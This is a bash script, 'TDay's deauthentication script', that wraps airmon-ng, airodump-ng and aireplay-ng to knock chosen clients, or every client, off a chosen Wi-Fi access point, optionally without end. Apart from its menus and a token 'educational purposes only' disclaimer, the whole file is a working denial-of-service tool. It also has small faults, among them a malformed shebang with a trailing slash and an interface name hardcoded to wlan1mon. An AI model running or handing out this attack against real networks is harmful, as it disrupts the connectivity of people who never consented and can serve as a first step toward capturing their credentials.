#!/bin/bash/ 
#you may need to change the above shebang depending on where bash is located on your installation.
# Also you may need to change wlan1mon to whatever the default name of your wireless card in mpnitor mode is.
# Make sure to use responsibly ;)

RED='\033[0;31m'
reset
echo
echo -e "\e[36m   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
echo -e "\e[36m   ▓▓                                ▓▓\e[0m"
echo -e "\e[36m   ▓▓ TDay's deauthentication script ▓▓\e[0m"
echo -e "\e[36m   ▓▓                                ▓▓\e[0m"
echo -e "\e[36m   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
echo
echo
sleep 1
echo -e "\e[91m By using this free piece of software you are agreeing to \e[0m"
echo -e "\e[91m only use it for educational purposes and NOT to use it \e[0m"
echo -e "\e[91m for any malicious purposes. \e[0m"
echo
echo -e "\e[92m The creator of this script does NOT take any responsibility for anything done using this software. \e[0m"
echo
read -n1 -r -p "Press any key to agree to these terms" key
reset
echo
echo -e "\e[36m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[0m"
iwconfig
echo -e "\e[36m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\e[0m"
echo
echo "Enter the wireless adapter:"
read wi
echo $wi

# Set monitor mode

#airmon-ng stop $wi
airmon-ng start $wi

# Get the MAC adress of the target

airodump-ng wlan1mon
echo "please enter the MAC of target AP:"
read apmac

# loop that selects an individual target
# or attack every client on the network.

cmac=""
while [ 1 ]
do
echo "would you like to target a specific client?"
read yn
    case $yn in
        y) cmac="-c ";
           echo "enter the MAC of the target client";
           read newmac;
           cmac="$cmac $newmac ";

# This loop lets you attack multiple specific clients

        while [ 1 ]
            do
                echo "would you like to target a/nother/ specific client? (y = yes, n = No)"
                read yn
                    case $yn in
                        y) echo "please enter the MAC of the target client";
                              read newmac;
                           cmac="$cmac $newmac ";;
                        n) break;;
                        *) ;;
                    esac
            done;;
        n) break;;
        *) ;;
    esac
done

echo "how many de-auths?(0=infinite):"
read numof

# This gives the user more time before starting the script

echo ##########################################
echo #  Press any key to start deauth attack  #
echo ##########################################
read
aireplay-ng -0 $numof -a $apmac $cmac wlan1mon

echo ##########################################
echo #   deauthentication attack completed.   #
echo ##########################################
